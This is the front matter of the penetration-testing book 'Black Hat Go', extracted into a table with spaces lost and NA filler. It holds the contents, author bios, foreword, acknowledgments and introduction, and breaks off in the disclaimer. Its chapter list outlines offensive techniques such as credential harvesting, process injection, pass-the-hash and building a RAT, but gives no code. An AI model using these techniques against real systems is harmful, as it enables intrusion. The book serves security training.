Larger Text,Smaller Text,Symbol
ContentsinDetail,"1.
  CoverPage 
  
 2.
  TitlePage 
  
 3.
  CopyrightPage 
  
 4.
  AbouttheAuthors 
  
 5.
  BRIEFCONTENTS 
  
 6.
  CONTENTSINDETAIL 
  
 7.
  FOREWORD 
  
 8.
  ACKNOWLEDGMENTS 
  
 9.
  INTRODUCTION
  
 1.
  WhoThisBookIsFor 
  
 2.
  WhatThisBookIsn’t 
  
 3.
  WhyUseGoforHacking? 
  
 4.
  WhyYouMightNotLoveGo 
  
 5.
  ChapterOverview
  
 10.
  1GOFUNDAMENTALS
  
 1.
  SettingUpaDevelopmentEnvironment 
  
 2.
  UnderstandingGoSyntax 
  
 3.
  Summary
  
 11.
  2TCP,SCANNERS,ANDPROXIES
  
 1.
  UnderstandingtheTCPHandshake 
  
 2.
  BypassingFirewallswithPortForwarding 
  
 3.
  WritingaTCPScanner 
  
 4.
  BuildingaTCPProxy 
  
 5.
  Summary
  
 12.
  3HTTPCLIENTSANDREMOTEINTERACTIONWITHTOOLS
  
 1.
  HTTPFundamentalswithGo 
  
 2.
  BuildinganHTTPClientThatInteractswithShodan 
  
 3.
  InteractingwithMetasploit 
  
 4.
  ParsingDocumentMetadatawithBingScraping 
  
 5.
  Summary
  
  
 HivaNetwork.Com",NA
BLACKHATGO ,NA,NA
GoProgrammingforHackersand ,NA,NA
Pentesters,NA,NA
"byTomSteele,ChrisPatten,andDanKottmann",NA,NA
SanFrancisco,NA,NA
ABOUTTHEAUTHORS,NA,NA
TomSteele,NA,NA
hasbeenusingGosincetheversion1releasein ,NA,NA
2012andwasoneofthefirstinhisfieldtoleveragethe ,NA,NA
languageforoffensivetooling.Heisamanagingprincipal ,NA,NA
researchconsultantatAtredisPartnerswithover10yearsof ,NA,NA
experienceperformingadversarialandresearch-,NA,NA
basedsecurity ,NA,NA
assessments.Tomhaspresentedandconductedtraining ,NA,NA
"coursesatnumerousconferences,includingDefcon,Black ",NA,NA
"Hat,DerbyCon,andBSides.Outsideoftech,Tomisalsoa ",NA,NA
"BlackBeltinBrazilianjiujitsuwhocompetesregularly,both ",NA,NA
regionallyandnationally.Heownsandoperateshisown ,NA,NA
jiujitsuacademyinIdaho.,NA,NA
ChrisPatten,NA,NA
isthefoundingpartnerandleadconsultantof ,NA,NA
"STACKTITAN,aspecializedadversarialservicessecurity ",NA,NA
consultancy.Chrishasbeenpracticinginthesecurityindustry ,NA,NA
formorethan25yearsinvariouscapacities.Hespentthelast ,NA,NA
decadeconsultingforanumberofcommercialand ,NA,NA
"governmentorganizationsondiversesecurityissues,includin",NA,NA
g ,NA,NA
"adversarialoffensivetechniques,threathuntingcapabilities, ",NA,NA
andmitigationstrategies.Chrisspenthislatesttenureleading ,NA,NA
oneofNorthAmerica’slargestadvancedadversarialteams.,NA,NA
"Priortoformalconsulting,Chrishonorablyservedinthe ",NA,NA
"USAirForce,supportingthewar-fightingeffort.Heactively ",NA,NA
servedwithintheDepartmentofDefenseSpecialOperations ,NA,NA
"IntelligencecommunityatUSSOCOM,consultingforSpecial ",NA,NA
OperationsGroupsonsensitivecyberwarfareinitiatives.,NA,NA
"FollowingChris’smilitaryservice,heheldleadarchitect",NA,NA
positionsatnumerousFortune500telecommunication ,NA,NA
"companies,workingwithpartnersinaresearchcapacity",NA,NA
.,NA,NA
DanKottmann,NA,NA
isafoundingpartnerandleadconsultantof ,NA,NA
STACKTITAN.Hehasplayedanintegralroleinthegrowth ,NA,NA
anddevelopmentofthelargestNorthAmericanadversarial ,NA,NA
"consultancy,directlyinfluencingtechnicaltradecraft,process ",NA,NA
"efficiency,customerexperience,anddeliveryquality.With15 ",NA,NA
"yearsofexperience,Danhasdedicatednearlytheentiretyof ",NA,NA
"hisprofessionalcareertocross-industry,customer-direct ",NA,NA
"consultingandconsultancydevelopment,primarilyfocusedo",NA,NA
n informationsecurityandapplicationdelivery.,NA,NA
Danhaspresentedatvariousnationalandregionalsecurity ,NA,NA
"conferences,includingDefcon,BlackHatArsenal,DerbyCon, ",NA,NA
"BSides,andmore.Hehasapassionforsoftwaredevelopment ",NA,NA
andhascreatedvariousopen-sourceandproprietary ,NA,NA
"applications,fromsimplecommandlinetoolstocomplex, ",NA,NA
"three-tier,andcloud-basedwebapplications.",NA,NA
ABOUTTHETECHNICALREVIEWER,NA,NA
AlexHarvey,NA,NA
hasbeenworkingwithtechnologyhiswholelife ,NA,NA
"andgothisstartwithembeddedsystems,robotics,and ",NA,NA
programming.Hemovedintoinformationsecurityabout15 ,NA,NA
"yearsago,focusingonsecuritytestingandresearch.Neverone ",NA,NA
"toshyawayfrommakingatoolforthejob,hestartedusing ",NA,NA
theGoprogramminglanguageandhasnotlookedback.,NA,NA
BRIEFCONTENTS,"ForewordbyHDMoore 
  
 Acknowledgments 
  
 Introduction 
  
 Chapter1:GoFundamentals 
  
 Chapter2:TCP,Scanners,andProxies 
  
 Chapter3:HTTPClientsandRemoteInteractionwithTools 
 Chapter4:HTTPServers,Routing,andMiddleware 
  
 Chapter5:ExploitingDNS 
  
 Chapter6:InteractingwithSMBandNTLM 
  
 Chapter7:AbusingDatabasesandFilesystems 
  
 Chapter8:RawPacketProcessing 
  
 Chapter9:WritingandPortingExploitCode 
  
 Chapter10:GoPluginsandExtendableTools 
  
 Chapter11:ImplementingandAttackingCryptography 
 Chapter12:WindowsSystemInteractionandAnalysis 
 Chapter13:HidingDatawithSteganography 
  
 Chapter14:BuildingaCommand-and-ControlRAT 
  
 Index",NA
CONTENTSINDETAIL,NA,NA
FOREWORDbyHDMoore,NA,NA
ACKNOWLEDGMENTS,NA,NA
INTRODUCTION,"WhoThisBookIsFor 
  
 WhatThisBookIsn’t 
  
 WhyUseGoforHacking?
  
 WhyYouMightNotLoveGo 
  
 ChapterOverview",NA
1 ,NA,NA
GOFUNDAMENTALS,"SettingUpaDevelopmentEnvironment 
  
  
 DownloadingandInstallingGo 
  
  
 SettingGOROOTtoDefinetheGoBinaryLocation 
  
  
 SettingGOPATHtoDeterminetheLocationofYourGoWorkspace 
  
 ChoosinganIntegratedDevelopmentEnvironment 
  
  
 UsingCommonGoToolCommands 
  
 UnderstandingGoSyntax 
  
  
 DataTypes 
  
  
 ControlStructures 
  
  
 Concurrency 
  
  
 ErrorHandling 
  
  
 HandlingStructuredData 
  
 Summary",NA
2 ,NA,NA
"TCP,SCANNERS,ANDPROXIES","UnderstandingtheTCPHandshake 
  
 BypassingFirewallswithPortForwardin
 g",NA
3 ,NA,NA
HTTPCLIENTSANDREMOTEINTERACTIONWITH TOOLS,"HTTPFundamentalswithGo 
  
  
 CallingHTTPAPIs 
  
  
 GeneratingaRequest 
  
  
 UsingStructuredResponseParsing 
  
 BuildinganHTTPClientThatInteractswithShodan 
  
  
 ReviewingtheStepsforBuildinganAPIClient 
  
  
 DesigningtheProjectStructure 
  
  
 CleaningUpAPICalls 
  
  
 QueryingYourShodanSubscription 
  
  
 CreatingaClient 
  
 InteractingwithMetasploit 
  
  
 SettingUpYourEnvironment 
  
  
 DefiningYourObjective 
  
  
 RetrievingaValidToken 
  
  
 DefiningRequestandResponseMethods 
  
  
 CreatingaConfigurationStructandanRPCMethod 
  
  
 PerformingRemoteCalls 
  
  
 CreatingaUtilityProgram 
  
 ParsingDocumentMetadatawithBingScraping 
  
  
 SettingUptheEnvironmentandPlanning 
  
  
 DefiningthemetadataPackage 
  
  
 MappingtheDatatoStructs 
  
  
 SearchingandReceivingFileswithBing 
  
 Summary
  
  
 HivaNetwork.Com",NA
4,NA,NA
"HTTPSERVERS,ROUTING,ANDMIDDLEWARE","HTTPServerBasics 
  
  
 BuildingaSimpleServer 
  
  
 BuildingaSimpleRouter 
  
  
 BuildingSimpleMiddleware 
  
  
 Routingwiththegorilla/muxPackage 
  
  
 BuildingMiddlewarewithNegroni 
  
  
 AddingAuthenticationwithNegroni 
  
  
 UsingTemplatestoProduceHTMLResponses 
 CredentialHarvesting 
  
 KeyloggingwiththeWebSocketAPI 
  
 MultiplexingCommand-and-Control 
  
 Summary",NA
5 ,NA,NA
EXPLOITINGDNS,"WritingDNSClients 
  
  
 RetrievingARecords 
  
  
 ProcessingAnswersfromaMsgstruct 
  
  
 EnumeratingSubdomains 
  
 WritingDNSServers 
  
  
 LabSetupandServerIntroduction 
  
  
 CreatingDNSServerandProxy 
  
 Summary",NA
6 ,NA,NA
INTERACTINGWITHSMBANDNTLM,"TheSMBPackage 
  
 UnderstandingSMB 
  
  
 UnderstandingSMBSecurityTokens 
  
  
 SettingUpanSMBSession 
  
  
 UsingMixedEncodingofStructFields 
  
  
 UnderstandingMetadataandReferentialFields 
  
 UnderstandingtheSMBImplementation 
  
 GuessingPasswordswithSMB 
  
 ReusingPasswordswiththePass-the-HashTechnique",NA
7 ,NA,NA
ABUSINGDATABASESANDFILESYSTEMS,"SettingUpDatabaseswithDocker 
  
  
 InstallingandSeedingMongoDB 
  
  
 InstallingandSeedingPostgreSQLandMySQLDatabases 
  
 InstallingandSeedingMicrosoftSQLServerDatabases 
 ConnectingandQueryingDatabasesinGo 
  
  
 QueryingMongoDB 
  
  
 QueryingSQLDatabases 
  
 BuildingaDatabaseMiner 
  
  
 ImplementingaMongoDBDatabaseMiner 
  
  
 ImplementingaMySQLDatabaseMiner 
  
 PillagingaFilesystem 
  
 Summary",NA
8 ,NA,NA
RAWPACKETPROCESSING,"SettingUpYourEnvironment 
  
 IdentifyingDevicesbyUsingthepcapSubpackage 
  
 LiveCapturingandFilteringResults 
  
 SniffingandDisplayingCleartextUserCredentials 
  
 PortScanningThroughSYN-floodProtections 
  
  
 CheckingTCPFlags 
  
  
 BuildingtheBPFFilter 
  
  
 WritingthePortScanner 
  
 Summary",NA
9 ,NA,NA
WRITINGANDPORTINGEXPLOITCODE,"CreatingaFuzzer 
  
 BufferOverflowFuzzing 
  
 SQLInjectionFuzzing",NA
10 ,NA,NA
GOPLUGINSANDEXTENDABLETOOLS,"UsingGo’sNativePlug-inSystem 
  
  
 CreatingtheMainProgram 
  
  
 BuildingaPassword-GuessingPlug-in 
  
 RunningtheScanner 
  
 BuildingPlug-insinLua 
  
  
 Creatingthehead()HTTPFunction 
  
  
 Creatingtheget()Function 
  
  
 RegisteringtheFunctionswiththeLuaVM 
  
 WritingYourMainFunction 
  
  
 CreatingYourPlug-inScript 
  
  
 TestingtheLuaPlug-in 
  
 Summary",NA
11,NA,NA
IMPLEMENTINGANDATTACKING ,NA,NA
CRYPTOGRAPHY,"ReviewingBasicCryptographyConcepts 
  
 UnderstandingtheStandardCryptoLibrary 
  
 ExploringHashing 
  
  
 CrackinganMD5orSHA-256Hash 
  
  
 Implementingbcrypt 
  
 AuthenticatingMessages 
  
 EncryptingData 
  
  
 Symmetric-KeyEncryption",NA
12 ,NA,NA
WINDOWSSYSTEMINTERACTIONANDANALYSIS,"TheWindowsAPI’sOpenProcess()Function 
  
 Theunsafe.PointeranduintptrTypes 
  
 PerformingProcessInjectionwiththesyscallPackage 
  
  
 DefiningtheWindowsDLLsandAssigningVariables 
  
  
 ObtainingaProcessTokenwiththeOpenProcessWindowsAPI 
  
 ManipulatingMemorywiththeVirtualAllocExWindowsAPI 
  
 WritingtoMemorywiththeWriteProcessMemoryWindowsAPI 
  
 FindingLoadLibraryAwiththeGetProcessAddressWindowsAPI 
  
 ExecutingtheMaliciousDLLUsingtheCreateRemoteThread 
  
  
 WindowsAPI 
  
  
 VerifyingInjectionwiththeWaitforSingleObjectWindowsAPI 
  
 CleaningUpwiththeVirtualFreeExWindowsAPI 
  
  
 AdditionalExercises 
  
 ThePortableExecutableFile 
  
  
 UnderstandingthePEFileFormat 
  
  
 WritingaPEParser 
  
  
 AdditionalExercises 
  
 UsingCwithGo 
  
  
 InstallingaCWindowsToolchain 
  
  
 CreatingaMessageBoxUsingCandtheWindowsAPI 
  
  
 BuildingGointoC 
  
 Summary",NA
13 ,NA,NA
HIDINGDATAWITHSTEGANOGRAPHY,"ExploringthePNGFormat 
  
  
 TheHeader",NA
14,NA,NA
BUILDINGACOMMAND-AND-CONTROLRAT,"GettingStarted 
  
  
 InstallingProtocolBuffersforDefiningagRPCAPI 
  
  
 CreatingtheProjectWorkspace 
  
 DefiningandBuildingthegRPCAPI 
  
 CreatingtheServer 
  
  
 ImplementingtheProtocolInterface 
  
  
 Writingthemain()Function 
  
 CreatingtheClientImplant 
  
 BuildingtheAdminComponent 
  
 RunningtheRAT 
  
 ImprovingtheRAT 
  
  
 EncryptYourCommunications 
  
  
 HandleConnectionDisruptions 
  
  
 RegistertheImplants 
  
  
 AddDatabasePersistence 
  
  
 SupportMultipleImplants 
  
  
 AddImplantFunctionality 
  
  
 ChainOperatingSystemCommands 
  
  
 EnhancetheImplant’sAuthenticityandPracticeGoodOPSEC 
  
 AddASCIIArt 
  
 Summary",NA
INDEX,NA,NA
FOREWORD,NA,NA
Programminglanguageshavealwayshadanimpacton ,NA,NA
"informationsecurity.Thedesignconstraints,standard ",NA,NA
"libraries,andprotocolimplementationsavailablewithineach ",NA,NA
languageendupdefiningtheattacksurfaceofanyapplication ,NA,NA
builtonthem.Securitytoolingisnodifferent;theright ,NA,NA
languagecansimplifycomplextasksandmaketheincredibly ,NA,NA
"difficultonestrivial.Go’scross-platformsupport,single-",NA,NA
"binaryoutput,concurrencyfeatures,andmassiveecosystem ",NA,NA
makeitanamazingchoiceforsecuritytooldevelopment.Go ,NA,NA
isrewritingtherulesforbothsecureapplicationdevelopment ,NA,NA
"andthecreationofsecuritytools,enablingfaster,safer,and ",NA,NA
moreportabletooling.,NA,NA
Overthe15yearsthatIworkedontheMetasploit ,NA,NA
"Framework,theprojectwentthroughtwofullrewrites, ",NA,NA
"changedlanguagesfromPerltoRuby,andnowsupportsa ",NA,NA
"rangeofmultilingualmodules,extensions,andpayloads.",NA,NA
Thesechangesreflecttheconstantlyevolvingnatureof ,NA,NA
"softwaredevelopment;inordertokeepupinsecurity,your ",NA,NA
"toolsneedtoadapt,andusingtherightlanguagecansavean ",NA,NA
"enormousamountoftime.ButjustlikeRuby,Godidn’t ",NA,NA
becomeubiquitousovernight.Ittakesaleapoffaithtobuild ,NA,NA
"anythingofvalueusinganewlanguage,giventhe ",NA,NA
uncertaintiesoftheecosystemandthesheeramountofeffort ,NA,NA
neededtoaccomplishcommontasksbeforethestandard ,NA,NA
librariescatchup.,NA,NA
Theauthorsof,NA,NA
BlackHatGo,NA,NA
arepioneersinGosecurity ,NA,NA
"tooldevelopment,responsibleforsomeoftheearliestopen",NA,NA
"sourceGoprojects,includingBlackSheepWall,Lair ",NA,NA
"Framework,andsipbrute,amongmanyothers.Theseprojects ",NA,NA
serveasexcellentexamplesofwhatcanbebuiltusingthe ,NA,NA
language.Theauthorsarejustascomfortablebuilding ,NA,NA
"softwareastearingitapart,andthisbookisagreatexampleof ",NA,NA
theirabilitytocombinetheseskills.,NA,NA
BlackHatGo,NA,NA
provideseverythingnecessarytogetstarted ,NA,NA
withGodevelopmentinthesecurityspacewithoutgetting ,NA,NA
boggeddownintothelesser-usedlanguagefeatures.Wantto ,NA,NA
"writearidiculousfastnetworkscanner,evilHTTPproxy,or ",NA,NA
cross-platformcommand-and-,NA,NA
controlframework?Thisbookis ,NA,NA
foryou.Ifyouareaseasonedprogrammerlookingforinsight ,NA,NA
"intosecuritytooldevelopment,thisbookwillintroducethe ",NA,NA
conceptsandtrade-offsthathackersofallstripesconsider ,NA,NA
whenwritingtools.VeteranGodeveloperswhoareinterested ,NA,NA
"insecuritymaylearnalotfromtheapproachestakenhere,as ",NA,NA
buildingtoolstoattackothersoftwarerequiresadifferent ,NA,NA
mindsetthantypicalapplicationdevelopment.Yourdesign ,NA,NA
trade-offswilllikelybesubstantiallydifferentwhenyour ,NA,NA
goalsincludebypassingsecuritycontrolsandevading ,NA,NA
detection.,NA,NA
"Ifyoualreadyworkinoffensivesecurity,thisbookwill ",NA,NA
helpyoubuildutilitiesthatarelight-yearsfasterthanexisting ,NA,NA
solutions.Ifyouworkonthedefensesideorinincident ,NA,NA
"response,thisbookwillgiveyouanideaofhowtoanalyze ",NA,NA
anddefendagainstmalwarewrittenintheGolanguage.,NA,NA
Happyhacking!,NA,NA
HDMoore,NA,NA
FounderoftheMetasploitProjectandtheCriticalResearch,NA,NA
Corporation ,NA,NA
VPofResearchandDevelopmentatAtredisPartners,NA,NA
ACKNOWLEDGMENTS,NA,NA
"ThisbookwouldnotbepossiblehadRobertGriesemer,Rob ",NA,NA
"Pike,andKenThompsonnotcreatedthisawesome ",NA,NA
developmentlanguage.ThesefolksandtheentirecoreGo ,NA,NA
developmentteamconsistentlycontributeusefulupdatesupo,NA,NA
n eachrelease.Wewouldhaveneverwrittenthisbookhadthe ,NA,NA
languagenotbeensoeasyandfuntolearnanduse.,NA,NA
TheauthorswouldalsoliketothanktheteamatNoStarch ,NA,NA
"Press:Laurel,Frances,Bill,Annie,Barbara,andeveryoneelse ",NA,NA
withwhomweinteracted.Youallguidedusthroughthe ,NA,NA
uncharteredterritoryofwritingourfirstbook.Lifehappens—,NA,NA
"newfamilies,newjobs—andallthewhileyou’vebeenpatient ",NA,NA
butstillpushedustocompletethisbook.TheentireNoStarch ,NA,NA
Pressteamhasbeenapleasuretoworkwithonthisproject.,NA,NA
"IwouldliketothankJenforallhersupport,encouragement, ",NA,NA
andforkeepinglifemovingforwardwhileIwaslockedaway ,NA,NA
"inmyofficenightsandweekends,workingonthisnever-",NA,NA
"endingbook.Jen,youhelpedmemorethanyouknow,and ",NA,NA
yourconstantwordsofencouragementhelpedmakethisa ,NA,NA
reality.Iamsincerelygratefultohaveyouinmylife.Imust ,NA,NA
thank“T”(mycaninequadra-pet)forholdingthefloordown ,NA,NA
inmyofficewhileIhackedawayandremindingmethat“outsid,NA,NA
"e”isarealplaceIshouldvisit.Lastly,andclosetomy ",NA,NA
"heart,Iwanttodedicatethisbooktomypups,Lunaand ",NA,NA
"Annie,whopassedwhileIwaswritingthisbook.Yougirls ",NA,NA
wereandareeverythingtomeandthisbookwillalwaysbea ,NA,NA
reminderofmyloveforyouboth.,NA,NA
ChrisPatten,NA,NA
Iwouldliketoextendasincerethankyoutomywifeandbest ,NA,NA
"friend,Katie,foryourconstantsupport,encouragement,and ",NA,NA
beliefinme.NotadaygoesbywhenI’mnotgratefulfor ,NA,NA
everythingyoudoformeandourfamily.I’dliketothank ,NA,NA
BrooksandSubsforgivingmereasontoworksohard.There ,NA,NA
isnobetterjobthanbeingyourfather.Andtothebest“Office ,NA,NA
"Hounds”aguycouldaskfor—Leo(RIP),Arlo,Murphy,and ",NA,NA
"evenHowie(yes,Howietoo)—you’vesystematically ",NA,NA
destroyedmyhouseandperiodicallymademequestionmy ,NA,NA
"lifechoices,butyourpresenceandcompanionshipmeanthe ",NA,NA
worldtome.I’llgiveeachofyouasignedcopyofthisbookto ,NA,NA
chewon.,NA,NA
DanKottmann,NA,NA
"Thankyoutotheloveofmylife,Jackie,foryourloveand ",NA,NA
encouragement;nothingIdowouldbepossiblewithoutyour ,NA,NA
supportandeverythingyoudoforourfamily.Thankyouto ,NA,NA
myfriendsandcolleaguesatAtredisPartnersandtoanyone ,NA,NA
I’vesharedashellwithinthepast.IamwhereIambecauseof ,NA,NA
you.Thankyoutomymentorsandfriendswhohavebelieved ,NA,NA
inmesincedayone.Therearetoomanyofyoutoname;Iam ,NA,NA
"gratefulfortheincrediblepeopleinmylife.Thankyou,Mom, ",NA,NA
forputtingmeincomputerclasses(thesewereathing).,NA,NA
"Lookingback,thosewereacompletewasteoftimeandIspent ",NA,NA
"mostofthetimeplayingMyst,butitsparkedaninterest(I ",NA,NA
"missthe90s).Mostimportantly,thankyoutomySavior,Jesus ",NA,NA
Christ.,NA,NA
TomSteele,NA,NA
Itwasalongroadtogethere—almostthreeyears.Alot ,NA,NA
"hashappenedtogettothispoint,andhereweare,finally.We ",NA,NA
sincerelyappreciatetheearlyfeedbackwereceivedfrom ,NA,NA
"friends,colleagues,family,andearly-releasereaders.Foryour ",NA,NA
"patience,dearreader,thankyouso,soverymuch;wearetruly ",NA,NA
gratefulandhopeyouenjoythisbookjustasmuchaswe ,NA,NA
enjoyedwritingit.Allthebesttoyou!NowGocreatesome ,NA,NA
amazingcode!,NA,NA
INTRODUCTION,NA,NA
"Foraboutsixyears,thethreeofusledoneofNorthAmerica’s ",NA,NA
largestdedicatedpenetration-testingconsultingpractices.As ,NA,NA
"principalconsultants,weexecutedtechnicalprojectwork, ",NA,NA
"includingnetworkpenetrationtests,onbehalfofourclients—",NA,NA
"butwealsospearheadedthedevelopmentofbettertools, ",NA,NA
"processes,andmethodology.Andatsomepoint,weadopted ",NA,NA
Goasoneofourprimarydevelopmentlanguages.,NA,NA
Goprovidesthebestfeaturesofotherprogramming ,NA,NA
"languages,strikingabalancebetweenperformance,safety, ",NA,NA
"anduser-friendliness.Soon,wedefaultedtoitasourlanguage ",NA,NA
"ofchoicewhendevelopingtools.Eventually,weevenfound ",NA,NA
"ourselvesactingasadvocatesofthelanguage,pushingforour ",NA,NA
colleaguesinthesecurityindustrytotryit.Wefeltthebenefits ,NA,NA
ofGowereatleastworthyofconsideration.,NA,NA
"Inthisbook,we’lltakeyouonajourneythroughtheGo ",NA,NA
programminglanguagefromtheperspectiveofsecurity ,NA,NA
"practitionersandhackers.Unlikeotherhackingbooks,we ",NA,NA
won’tjustshowyouhowtoautomatethird-partyor ,NA,NA
commercialtools(althoughwe’lltouchonthatalittle). ,NA,NA
"Instead,we’lldelveintopracticalanddiversetopicsthat",NA,NA
"approachaspecificproblem,protocol,ortacticusefulto ",NA,NA
"adversaries.We’llcoverTCP,HTTP,andDNS ",NA,NA
"communications,interactwithMetasploitandShodan,searc",NA,NA
h ,NA,NA
"filesystemsanddatabases,portexploitsfromotherlanguage",NA,NA
"s toGo,writethecorefunctionsofanSMBclient,attack ",NA,NA
"Windows,cross-compilebinaries,messwithcrypto,callC ",NA,NA
"libraries,interactwiththeWindowsAPI,andmuch,much ",NA,NA
more.It’sambitious!We’dbetterbegin...,NA,NA
WHOTHISBOOKISFOR,NA,NA
Thisbookisforanyonewhowantstolearnhowtodevelop ,NA,NA
theirownhackingtoolsusingGo.Throughoutourprofessional ,NA,NA
"careers,andparticularlyasconsultants,we’veadvocatedfor ",NA,NA
programmingasafundamentalskillforpenetrationtestersan,NA,NA
"d securityprofessionals.Specifically,theabilitytocode ",NA,NA
enhancesyourunderstandingofhowsoftwareworksandhow ,NA,NA
"itcanbebroken.Also,ifyou’vewalkedinadeveloper’s ",NA,NA
"shoes,you’llgainamoreholisticappreciationforthe ",NA,NA
"challengestheyfaceinsecuringsoftware,andyoucanuse ",NA,NA
"yourpersonalexperiencetobetterrecommendmitigations, ",NA,NA
"eliminatefalsepositives,andlocateobscurevulnerabilities.",NA,NA
Codingoftenforcesyoutointeractwiththird-partylibraries ,NA,NA
andvariousapplicationstacksandframeworks.Formany ,NA,NA
"people(usincluded),it’shands-onexperienceandtinkering ",NA,NA
thatleadstothegreatestpersonaldevelopment.,NA,NA
"Togetthemostoutofthisbook,weencourageyouto ",NA,NA
clonethebook’sofficialcoderepositorysoyouhaveallthe ,NA,NA
workingexampleswe’lldiscuss.Findtheexamplesat ,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.,NA,NA
WHATTHISBOOKISN’T,NA,NA
ThisbookisnotanintroductiontoGoprogrammingingeneral ,NA,NA
butanintroductiontousingGofordevelopingsecuritytools.,NA,NA
Wearehackersandthencoders—inthatorder.Noneofus ,NA,NA
"haveeverbeensoftwareengineers.Thismeansthat,as ",NA,NA
"hackers,weputapremiumonfunctionoverelegance.Inmany ",NA,NA
"instances,we’veoptedtocodeashackersdo,disregarding ",NA,NA
someoftheidiomsorbestpracticesofsoftwaredesign.As ,NA,NA
"consultants,timeisalwaysscarce;developingsimplercodeis ",NA,NA
"oftenfasterand,therefore,preferableoverelegance.When ",NA,NA
"youneedtoquicklycreateasolutiontoaproblem,style ",NA,NA
concernscomesecondary.,NA,NA
"ThisisboundtoangerGopurists,whowilllikelytweetat ",NA,NA
"usthatwedon’tgracefullyhandleallerrorconditions,thatour ",NA,NA
"examplescouldbeoptimized,orthatbetterconstructsor ",NA,NA
methodsareavailabletoproducethedesiredresults.We’re ,NA,NA
"not,inmostcases,concernedwithteachingyouthebest,the ",NA,NA
"mostelegant,or100percentidiomaticsolutions,unlessdoing ",NA,NA
sowillconcretelybenefittheendresult.Althoughwe’ll ,NA,NA
"brieflycoverthelanguagesyntax,wedosopurelytoestablish ",NA,NA
"abaselinefoundationuponwhichwecanbuild.Afterall,this ",NA,NA
isn’t,NA,NA
LearningtoProgramElegantlywithGo,NA,NA
—thisis,NA,NA
Black ,NA,NA
HatGo,NA,NA
.,NA,NA
WHYUSEGOFORHACKING?,NA,NA
"PriortoGo,youcouldprioritizeeaseofusebyusing ",NA,NA
dynamicallytypedlanguages—,NA,NA
"suchasPython,Ruby,orPHP—",NA,NA
"attheexpenseofperformanceandsafety.Alternatively,you ",NA,NA
"couldchooseastaticallytypedlanguage,likeCorC++,that",NA,NA
offershighperformanceandsafetybutisn’tveryuser-friendly.,NA,NA
"GoisstrippedofmuchoftheuglinessofC,itsprimary ",NA,NA
"ancestor,makingdevelopmentmoreuser-",NA,NA
friendly.Atthesame ,NA,NA
"time,it’sastaticallytypedlanguagethatproducessyntax ",NA,NA
"errorsatcompiletime,increasingyourassurancethatyour ",NA,NA
"codewillactuallyrunsafely.Asit’scompiled,itperforms ",NA,NA
moreoptimallythaninterpretedlanguagesandwasdesigned ,NA,NA
"withmulticorecomputingconsiderations,makingconcurren",NA,NA
t programmingabreeze.,NA,NA
ThesereasonsforusingGodon’tconcernsecurity ,NA,NA
"practitionersspecifically.However,manyofthelanguage’s ",NA,NA
featuresareparticularlyusefulforhackersandadversaries:,NA,NA
Cleanpackagemanagementsystem,NA,NA
Go’spackage ,NA,NA
managementsolutioniselegantandintegrateddirectlywit,NA,NA
h Go’stooling.Throughtheuseofthe,go,NA
"binary,youcan",NA,NA
"easilydownload,compile,andinstallpackagesand ",NA,NA
"dependencies,whichmakesconsumingthird-",NA,NA
partylibraries simpleandgenerallyfreefromconflict.,NA,NA
Cross-compilation,NA,NA
OneofthebestfeaturesinGoisits ,NA,NA
abilitytocross-compileexecutables.Solongasyourcode ,NA,NA
"doesn’tinteractwithrawC,youcaneasilywritecodeon ",NA,NA
yourLinuxorMacsystembutcompilethecodeina ,NA,NA
"Windows-friendly,PortableExecutableformat.",NA,NA
Richstandardlibrary,NA,NA
Timespentdevelopinginother ,NA,NA
languageshashelpedusappreciatetheextentofGo’s ,NA,NA
standardlibrary.Manymodernlanguageslackthestandar,NA,NA
d librariesrequiredtoperformmanycommontaskssuchas ,NA,NA
"crypto,networkcommunications,databaseconnectivity, ",NA,NA
"anddataencoding(JSON,XML,Base64,hex).Go",NA,NA
includesmanyofthesecriticalfunctionsandlibrariesas ,NA,NA
"partofthelanguage’sstandardpackaging,reducingthe ",NA,NA
effortnecessarytocorrectlysetupyourdevelopment ,NA,NA
environmentortocallthefunctions.,NA,NA
Concurrency,NA,NA
Unlikelanguagesthathavebeenaround ,NA,NA
"longer,Gowasreleasedaroundthesametimeastheinitial ",NA,NA
mainstreammulticoreprocessorsbecameavailable.For ,NA,NA
"thisreason,Go’sconcurrencypatternsandperformance ",NA,NA
optimizationsaretunedspecificallytothismodel.,NA,NA
WHYYOUMIGHTNOTLOVEGO,NA,NA
WerecognizethatGoisn’taperfectsolutiontoevery ,NA,NA
problem.Herearesomeofthedownsidesofthelanguage:,NA,NA
Binarysize,NA,NA
"’Nuffsaid.WhenyoucompileabinaryinGo, ",NA,NA
thebinaryislikelytobemultiplemegabytesinsize.Of ,NA,NA
"course,youcanstripdebuggingsymbolsanduseapacker ",NA,NA
"tohelpreducethesize,butthesestepsrequireattention.",NA,NA
"Thiscanbeadrawback,particularlyforsecurity ",NA,NA
"practitionerswhoneedtoattachabinarytoanemail,hostit ",NA,NA
"onasharedfilesystem,ortransferitoveranetwork.",NA,NA
Verbosity,NA,NA
WhileGoislessverbosethanlanguageslike ,NA,NA
"C#,Java,orevenC/C++,youstillmightfindthatthe ",NA,NA
simplisticlanguageconstructforcesyoutobeoverly ,NA,NA
expressiveforthingslikelists(called,NA,NA
slices,NA,NA
"inGo), ",NA,NA
"processing,looping,orerrorhandling.APythonone-liner ",NA,NA
mighteasilybecomeathree-linerinGo.,NA,NA
CHAPTEROVERVIEW,NA,NA
ThefirstchapterofthisbookcoversabasicoverviewofGo’s ,NA,NA
"syntaxandphilosophy.Next,westarttoexploreexamplesthat ",NA,NA
"youcanleveragefortooldevelopment,includingvarious ",NA,NA
"commonnetworkprotocolslikeHTTP,DNS,andSMB.We ",NA,NA
thendigintovarioustacticsandproblemsthatwe’ve ,NA,NA
"encounteredaspenetrationtesters,addressingtopicsincludi",NA,NA
"ng datapilfering,packetsniffing,andexploitdevelopment.",NA,NA
"Finally,wetakeabriefstepbacktotalkabouthowyoucan ",NA,NA
"createdynamic,pluggabletoolsbeforedivingintocrypto, ",NA,NA
"attackingMicrosoftWindows,andimplementing ",NA,NA
steganography.,NA,NA
"Inmanycases,therewillbeopportunitiestoextendthe ",NA,NA
toolsweshowyoutomeetyourspecificobjectives.Although ,NA,NA
"wepresentrobustexamplesthroughout,ourrealintentisto ",NA,NA
provideyouwiththeknowledgeandfoundationthrough ,NA,NA
whichyoucanextendorreworktheexamplestomeetyour ,NA,NA
goals.Wewanttoteachyoutofish.,NA,NA
"Beforeyoucontinuewithanythinginthisbook,pleasenote ",NA,NA
thatwe—theauthorsandpublisher—,NA,NA
havecreatedthiscontent ,NA,NA
forlegalusageonly.Wewon’tacceptanyliabilityforthe ,NA,NA
